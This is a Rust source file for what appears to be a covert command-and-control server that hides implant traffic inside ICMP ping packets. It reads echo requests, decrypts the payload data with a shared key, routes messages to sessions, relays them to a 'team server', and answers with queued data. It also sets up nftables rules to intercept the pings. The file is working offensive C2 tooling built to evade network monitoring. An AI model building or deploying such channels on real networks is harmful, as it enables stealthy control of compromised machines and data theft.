#![feature(slice_range)]
#![feature(never_type)]
mod nft;
mod web;
mod worker;
use anyhow::{bail, Result};

use crate::nft::NftRules;
use clap::Parser;
use covert_c2_ping_common::PingMessage;
use covert_common::CovertChannel;
use lazy_static::lazy_static;
use std::{collections::HashMap, time::Duration};
use tokio::{
    select,
    signal::{self, unix::SignalKind},
    sync::{
        mpsc::{self, UnboundedSender},
        Mutex,
    },
    task,
};
use tracing::{Instrument, Level};
use worker::PingTransaction;

#[derive(Parser)]
#[clap(author, version, about, long_about = None)]
struct Config {
    #[clap(long, value_parser,default_value_t=String::from("localhost"))]
    ts: String,
    #[clap(name="interface", long="i", value_parser,default_value_t=String::from("eth0"))]
    i: String,
    #[clap(long, value_parser)]
    key: String,
}

lazy_static! {
    static ref GLOBAL_CONF: Config = Config::parse();
    static ref KEY: [u8; 32] = {
        let key_string = *(&(*GLOBAL_CONF).key.as_bytes());
        let truncated = if key_string.len() > 32 {
            &key_string[..32]
        } else {
            key_string
        };
        let mut key_vec = truncated.to_vec();
        if key_vec.len() < 32 {
            key_vec.append(&mut vec![0u8; 32 - key_vec.len()]);
        }
        return key_vec.try_into().expect("Could not make array");
    };
    static ref CHANNEL: Mutex<CovertChannel<PingMessage, 4>> =
        Mutex::new(CovertChannel::<PingMessage, 4>::new(*KEY));
    static ref SESSIONS: Mutex<HashMap<u16, UnboundedSender<()>>> =
        Mutex::new(HashMap::<u16, UnboundedSender<()>>::new());
}

fn main() {
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .unwrap();
    rt.block_on(entry()).unwrap();
    rt.shutdown_timeout(Duration::from_secs(1));
    tracing::info!("Shutdown complete")
}

async fn entry() -> Result<()> {
    let conf = &(*GLOBAL_CONF);
    tracing_subscriber::fmt::init();

    tracing::info!("Team Server: {}", conf.ts);
    tracing::info!("Interface: {}", conf.i);
    tracing::info!("Key: {:02X?}", *KEY);
    tracing::info!("Starting...");

    let web_h = task::spawn(web::web_worker());
    web_h.await?;

    let rules = NftRules::new().or_else(|err| {
        tracing::info!("{:?}", err);
        bail!("Failed to make rules");
    })?;

    let sig_h = task::spawn(
        async move {
            let mut res =
                signal::unix::signal(SignalKind::interrupt()).expect("Couldn't wait on signal");
            res.recv().await;
            tracing::info!("Got SIGINT, starting shutdown");
        }
        .instrument(tracing::span!(Level::INFO, "signal_handle")),
    );

    let (downstream_sender, upstream_receiver, recv_h, send_h) = worker::start_workers()?;

    let main_h = task::spawn(main_loop(downstream_sender, upstream_receiver));

    select! {
        // _ = web_h => {}
        _ = recv_h => {}
        _ = send_h => {}
        _ = sig_h => {}
        _ = main_h => {}
    }

    drop(rules);
    tracing::info!("Shutting down");
    Ok(())
}

#[tracing::instrument(skip_all)]
async fn main_loop(
    downstream_sender: mpsc::UnboundedSender<PingTransaction>,
    mut upstream_reciever: mpsc::UnboundedReceiver<PingTransaction>,
) -> Result<()> {
    loop {
        tracing::info!("Waiting for message");
        let incoming_ping = match upstream_reciever.recv().await {
            Some(ping) => ping,
            None => {
                tracing::info!("Upstream worker closed");
                break;
            }
        };
        let channel_state = CHANNEL.lock().await.put_packet(&incoming_ping.data);
        let out_data: Vec<u8> = match channel_state {
            Ok((inc_chan, has_message)) => {
                if has_message {
                    let mut session_guard = SESSIONS.lock().await;
                    let session = session_guard.get(&inc_chan);
                    if let Some(notify) = session {
                        if let Err(_) = notify.send(()) {
                            tracing::info!(channel = inc_chan, "channel closed");
                            session_guard.remove(&inc_chan);
                        }
                    } else {
                        tracing::info!(channel = inc_chan, "not a valid channel");
                    }
                }
                let (in_num, out_num) = CHANNEL.lock().await.packets_in_queue(inc_chan);
                tracing::info!(
                    inbound_packets = in_num,
                    outbound_packets = out_num,
                    channel = inc_chan,
                    "channel status"
                );
                CHANNEL.lock().await.get_packet(inc_chan)
            }
            Err(e) => {
                match e {
                    covert_common::CovertError::DecryptionError => {
                        tracing::info!("Failed to decrypt packet")
                    }
                    covert_common::CovertError::InvalidHash => {
                        tracing::info!("Invalid hash in packet")
                    }
                    covert_common::CovertError::DeserializeError => {
                        tracing::info!("Failed to deserialize packets to message")
                    }
                }
                continue;
            }
        };

        let outgoing_ping = PingTransaction {
            src_mac: incoming_ping.dst_mac,
            dst_mac: incoming_ping.src_mac,
            src_ip: incoming_ping.dst_ip,
            dst_ip: incoming_ping.src_ip,
            sequence_number: incoming_ping.sequence_number,
            identifier: incoming_ping.identifier,
            data: out_data,
        };
        if let Err(e) = downstream_sender.send(outgoing_ping) {
            tracing::info!(error=?e,"Downstream worker closed");
            break;
        };
    }
    Ok(())
}
